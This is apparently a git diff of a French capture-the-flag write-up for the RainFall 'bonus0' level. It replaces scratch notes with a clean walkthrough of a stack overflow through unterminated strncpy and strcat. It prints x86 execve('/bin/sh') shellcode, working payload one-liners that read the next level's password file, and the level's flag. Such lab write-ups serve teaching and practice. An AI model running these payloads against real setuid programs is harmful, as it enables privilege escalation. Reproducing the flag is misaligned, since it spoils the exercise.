@@ -1,79 +1,90 @@
-system addresse = 0xb7e6b060 = \x60\xb0\xe6\xb7
- + offset = 0xb7e6b060 + 0x40000701 =  0xF7E6B761 = \x61\xb7\xe6\xf7
+# rainfall : [bonus0]
 
-\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x60\xb0\xe6\xb7\xc9\xc3
+Observations:
+---
 
-strcat = 0x8048390 sans offset
+#### Source décompilée:
+```c
+char *p(char *dest, char *s)
+{
+  char buf[4104];
 
+  puts(s);
+  read(0, buf, 0x1000u);
+  *strchr(buf, 10) = 0;
+  return strncpy(dest, buf, 0x14u);
+}
 
+char *pp(char *dest)
+{
+  char src[20];
+  char v3[28];
 
-(python -c "print('\x\x\x\x' + 'a'*4092)"; echo $(echo "\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x61\xb7\xe6\xf7\xc9\xc3")) | ./bonus0
+  p(src, " - ");
+  p(v3, " - ");
+  strcpy(dest, src);
+  *(_WORD *)&dest[strlen(dest)] = ' ';
+  return strcat(dest, v3);
+}
 
-(python -c "print('a'*409)"; echo $(python -c "print ('a'*96 + '\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x61\xb7\xe6\xf7\xc9\xc3')")) | ./bonus0
+int main(int argc, const char **argv, const char **envp)
+{
+  char s[42];
 
+  pp(s);
+  puts(s);
+  return 0;
+}
+```
 
-x50
-put add	= 0x80484bd
+#### Détails du programme:
+```bash
+-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
+```
 
-(echo "test un truc la on est pas des putes"; echo $(printf "oui 012345678901234567890123456789\xbd\x84\x04\x08")) | ./bonus0
+#### Fonctions:
 
-
-# random merde 4095 pour remplir le buffer (segfault a 4096) 
-# \n pour mettre la 2eme chaine de caractere
-python -c "print('a'*4095 + '\n' + 'test')" | ./bonus0
-
-echo "test un truc la on \n est pas des putes"
-
-
-Symbol "system" is at 0xb7e6b060 in a file compiled without debugging.
-
-0xb7e6b060 = \x60\xb0\xe60\xb7 - 0x77d8595f = F7F50761 = \x61\x07\xf5\xf7
-
-python -c "print('a'*4095 + '\n' + '\x61\x07\xf5\xf7')" | ./bonus0
-
-# 2eme chaine segfault a > 16 octets 
-
-python -c "print('a'*4095 + '\n' + 'a'*12 + '\x61\x07\xf5\xf7')" | ./bonus0
-
-
-
-#function call sh
-\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x29\xc0\xd3\xaf\xc9\xc3
-
-python -c "print('a'*20 + '\n' + 'a'*(4969 - 21) + )" | ./bonus0
-
-
-\x26\xf7\xff\xbf debut de notre chaine de caractere
-
-
-https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ # creation d'un autre shellcode
-https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html
-https://defuse.ca/online-x86-assembler.htm#disassembly2
-
-'\x68\x73\x2f\x2f\x6e\x69\x62\x2f'  = /bin//sh in reverse order 
-or can write : '\x68' + '//sh' + '\x68' + '/bin' (68 for push)
-(on ecrit dans la stack pour use le moins de carac possible)
+| Nom | Description |
+| --- | ----------- |
+| `<main>` | Appelle la fonction `<pp>` avec comme paramètre le tableau `s` de **42** octets puis affiche le contenu de ce dernier. |
+| `<pp>` | Execute la fonction `<p>` deux fois, avec pour chaque appelle son paramètre réspectif; <br> Le tableau `src` de **20** octets ainsi que le tableau `v3` de **28** octets. <br> Ensuite elle copie le contenu de `src` dans le tableau `dest` passée en paramètre d'entrée. <br> Le caractère après la fin de ce tableau est changé en `' '`. <br> Et pour finir `dest` est concaténé avec `v3` et la fonction retourne `dest`. |
+ | `<p>` | Affiche la chaîne de caractères `s` passée en paramètre puis lis **4096** octets de l'entrée standard pour les copier dans <br> le tableau `buf` de **4104** octets; Elle remplace ensuite le premier caractére `'\n'` atteignable par un `'\0'`. <br> Pour finir elle copie ensuite **20** octets du tableau `buf` vers `dest` qui est le tableau en paramètre de fonction et retourne ce dernier. |
 
 
-"\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
-'\x6a\x0b\x58\x31\xf6\x56\x68' + '//sh' + '\x68' + '/bin' +'\x89\xe3\x31\xc9\x89\xca\xcd\x80'
+#### Conclusions:
+Même si les fonctions de lectures et de copies parraissent sécurisées aux premier abord, nous pouvons terminer les chaînes de \
+caractères par autre chose que zéro. Les deux tableaux étant côte à côte dans la pile, l'appel à `<strcat>` copiera `dest` et `v3` avec `v3`.\
+Copiant ainsi jusqu'à **61** caractères permettant ainsi d'écraser l'addresse de retour de la fonction `<main>` qui a une pile de **64** octets. \
+Nous pouvons ainsi rediriger l'ordre d'exécution du programme.
 
 
-0:  6a 0b                   push   0xb
-2:  58                      pop    eax
-3:  31 f6                   xor    esi,esi
-5:  56                      push   esi
-6:  68 2f 2f 73 68          push   0x68732f2f
-b:  68 2f 62 69 6e          push   0x6e69622f
-10: 89 e3                   mov    ebx,esp
-12: 31 c9                   xor    ecx,ecx
-14: 89 ca                   mov    edx,ecx
-16: cd 80                   int    0x80 
-
-eip need to go = 0xBffff726 = \x26\xf7\xff\xbf
+----
+Résolution:
+----
+Nous allons remplir le tableau de la première chaîne avec **20** caractères aléatoires. \
+Ensuite nous injectons une fonction en shellcode suivis de caractères de bourrages pour compléter l'appel à `<read>` de **4096** octets. \
+Nous finissons par remplir partiellement le buffer de read avec **14** octets aléatoire suivis de l'addresse du buffer de `<read>` préalablement récupéré grace a gdb. \
+Puis nous rajoutons un octet de bourrage pour décaler correctement la position de l'addresse de retour du à l'ajout d'un espace au tableau `dest` dans la fonction `<pp>`.
 
 
-bonus0@RainFall:~$ ((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9' + '\x16' + '\x89\xca\xcd\x80' + 't' * 5 + '\x26\xf7\xff\xbf' + 'c' * 20)"); cat) | ./bonus0
-((python -c "print('\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9')"); (python -c "print('\x89\xca\xcd\x80' + 't' * 5 + '\x26\xf7\xff\xbf' + 'c' * 20)"); cat) | ./bonus0
+#### Injection:
+```asm
+# La fonction injectée appelle system avec '/bin/sh' en paramètre:
 
-On ecrit notre shellcode dans le buffer qui ne se reset pas, 20 octets pour la premiere chaine (ne pas mettre de /n ou de 0) puis les 4 premier octets de la seconde pour finir notre shellcode, on ajoute 5 octets random pour acceder a l adresse de eip (next instruction de la stack) pour pouvoir jmp au debut de notre shellcode puis x random caractere pour que notre seconde chaine fasse au minimum 20 caracteres (x > 6 pour faire au minimum 20 caracteres && x < (buffermax = 4096 - le nombre deja ecrit))
+0:  6a 0b                   	push   0xb
+2:  58                      	pop    eax
+3:  31 f6                   	xor    esi,esi
+5:  56                      	push   esi
+6:  68 2f 2f 73 68          	push   0x68732f2f
+b:  68 2f 62 69 6e          	push   0x6e69622f
+10: 89 e3                   	mov    ebx,esp
+12: 31 c9                   	xor    ecx,ecx
+14: 89 ca                   	mov    edx,ecx
+16: cd 80                   	int    0x80
+```
+#### Commande:
+```bash
+(python -c "print('A'*20+ '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'B'*(4096 - 20 - 24 - 1) + '\n' + 'B'*14 + '\x94\xe6\xff\xbf' + 'C')"; echo 'cat /home/user/bonus1/.pass') | /home/user/bonus0/bonus0
+```
+
+**Flag :** cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
